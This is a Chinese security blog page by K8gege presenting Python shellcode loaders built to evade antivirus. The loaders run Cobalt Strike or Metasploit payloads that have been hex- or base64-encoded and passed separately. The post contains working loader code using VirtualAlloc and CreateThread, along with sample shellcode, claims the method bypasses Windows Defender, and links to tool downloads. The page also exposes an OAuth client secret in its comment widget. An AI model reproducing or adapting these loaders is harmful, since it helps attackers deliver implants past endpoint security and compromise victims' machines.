@@ -1,0 +1,460 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Tool,Cobalt Strike,Metasploit,BypassAV">
+
+
+<meta name="description" content="0x001 原理
+采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。
+本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。
+PS: 何为SC加载器，即专...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Python免杀ShellCode加载器(Cobalt Strike/Metasploit) |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Python免杀ShellCode加载器(Cobalt Strike/Metasploit)">
+            
+            Python免杀ShellCode加载器(Cobalt Strike/Metasploit)
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/CS/">Cobalt Strike</a> <a class="category-link" href="/categories/Metasploit/">Metasploit</a> <a class="category-link" href="/categories/Python/">Python</a> <a class="category-link" href="/categories/ShellCode/">ShellCode</a> <a class="category-link" href="/categories/bypassAV/">免杀</a> <a class="category-link" href="/categories/Tool/">工具</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/BypassAV/" rel="tag">BypassAV</a> <a class="tag-none-link" href="/tags/CS/" rel="tag">Cobalt Strike</a> <a class="tag-none-link" href="/tags/Metasploit/" rel="tag">Metasploit</a> <a class="tag-none-link" href="/tags/Tool/" rel="tag">Tool</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2019/12/03</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1964</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
+<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
+<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
+<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
+<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
+<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
+<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
+<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
+<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
+<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
+<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
+<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
+<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
+<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
+<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
+<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
+<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
+<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
+<p>ScRunHex.py</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+#calc.exe
+#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
+shellcode=bytearray(sys.argv[1].decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>
+buf,<br>
+ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>
+ctypes.c_int(0),<br>
+ctypes.c_int(ptr),<br>
+ctypes.c_int(0),<br>
+ctypes.c_int(0),<br>
+ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br>
+</p></pre><p></p>
+</div>
+<pre class="brush:python;gutter:true;"></pre>
+<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
+<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
+<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
+<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
+<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
+<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
+<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
+<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
+<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
+<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
+<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
+<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
+<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
+<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+import base64
+#calc.exe
+#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
+shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>
+buf,<br>
+ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>
+ctypes.c_int(0),<br>
+ctypes.c_int(ptr),<br>
+ctypes.c_int(0),<br>
+ctypes.c_int(0),<br>
+ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br>
+</p></pre><p></p>
+</div>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
+<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
+<p>&nbsp;</p>
+<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
+<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
+<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
+<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
+<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
+<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
+<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
+<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
+<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
+<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
+<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
+<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
+<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
+<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
+<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/3f55538f.html" class="pre-post btn btn-default" title=".NET端口转发工具PortTran">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            .NET端口转发工具PortTran</span>
+    </a>
+    
+    
+    <a href="/p/68a8bf1b.html" class="next-post btn btn-default" title="SMB溢出工具加强版">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            SMB溢出工具加强版</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <p>not dir</p>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
